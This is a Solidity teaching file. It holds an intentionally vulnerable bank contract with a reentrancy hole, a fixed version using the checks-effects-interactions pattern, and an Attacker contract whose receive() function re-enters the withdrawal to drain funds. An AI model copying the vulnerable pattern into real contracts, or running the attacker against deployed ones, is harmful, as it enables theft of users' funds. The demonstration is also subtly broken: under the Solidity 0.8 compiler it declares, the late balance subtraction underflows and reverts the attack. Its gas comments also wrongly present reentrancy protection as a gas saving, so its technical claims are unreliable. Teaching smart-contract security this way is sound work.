// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title VulnerableBank
 * @notice INTENTIONALLY VULNERABLE contract for educational purposes
 * DO NOT USE IN PRODUCTION
 */
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    function deposit() public payable {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // ❌ VULNERABLE: External call before state update
    function withdrawVulnerable(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // DANGER: External call before updating state
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // TOO LATE: Attacker already re-entered
        balances[msg.sender] -= amount;
        emit Withdrawal(msg.sender, amount);
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title SecureBank
 * @notice SECURE implementation using Checks-Effects-Interactions pattern
 * 
 * REAL-WORLD ANALOGY: CEI pattern is like a bank teller - they check your ID
 * (checks), update your account balance (effects), THEN give you cash
 * (interactions). This prevents someone from withdrawing more than they have.
 * 
 * GAS OPTIMIZATION: Why CEI pattern saves gas?
 * - Vulnerable version: Attacker can drain contract, wasting gas on failed transactions
 * - Secure version: State updated first, preventing reentrancy loops
 * - Gas saved: Prevents infinite loops that could drain gas limit
 * 
 * SECURITY: CEI pattern prevents reentrancy attacks
 * - Update state BEFORE external calls
 * - Prevents attacker from re-entering with old state
 * - Critical for functions that send ETH or call external contracts
 */
contract SecureBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    /**
     * @notice Deposit ETH into the bank
     * 
     * GAS COST:
     * - SLOAD balance: ~100 gas (warm)
     * - SSTORE balance: ~5,000 gas (warm, non-zero to non-zero)
     * - Event: ~1,500 gas
     * - Total: ~6,600 gas
     */
    function deposit() public payable {
        require(msg.value > 0, "Must send ETH");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    /**
     * @notice Withdraw ETH from the bank (SECURE)
     * @param amount Amount to withdraw in wei
     * 
     * ✅ SECURE: Checks-Effects-Interactions pattern
     * 
     * GAS OPTIMIZATION: Why update balance before external call?
     * - Reading balance: 1 SLOAD = ~100 gas (warm)
     * - Updating balance: 1 SSTORE = ~5,000 gas (warm)
     * - External call: ~2,100 gas base
     * - If we call external first, attacker can re-enter with old balance
     * - Updating first prevents reentrancy, saving gas on failed attacks
     * 
     * GAS COST BREAKDOWN:
     * - CHECKS: 1 SLOAD = ~100 gas
     * - EFFECTS: 1 SSTORE = ~5,000 gas
     * - INTERACTIONS: External call = ~2,100 gas base
     * - Event: ~1,500 gas
     * - Total: ~8,700 gas (excluding recipient gas)
     * 
     * ALTERNATIVE (vulnerable):
     *   External call first, then update balance
     *   Costs: Same gas, but allows reentrancy attack
     *   Result: Attacker can drain contract, wasting all gas
     * 
     * REAL-WORLD ANALOGY: Like updating your bank account balance before
     * withdrawing cash - prevents overdrafts and ensures you can't withdraw
     * more than you have.
     */
    function withdraw(uint256 amount) public {
        // CHECKS
        // GAS: 1 SLOAD = ~100 gas (warm)
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        // EFFECTS (update state BEFORE external call)
        // GAS: 1 SSTORE = ~5,000 gas (warm, non-zero to non-zero)
        balances[msg.sender] -= amount;
        
        // INTERACTIONS (external calls LAST)
        // GAS: ~2,100 gas base + gas forwarded to recipient
        (bool success,) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        // GAS: Event emission = ~1,500 gas
        emit Withdrawal(msg.sender, amount);
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title Attacker
 * @notice Malicious contract that exploits reentrancy
 * FOR EDUCATIONAL PURPOSES ONLY
 */
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackAmount;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        
        bank.deposit{value: msg.value}();
        bank.withdrawVulnerable(msg.value);
    }
    
    // Fallback function - this is where reentrancy happens
    receive() external payable {
        if (address(bank).balance >= attackAmount) {
            bank.withdrawVulnerable(attackAmount);
        }
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
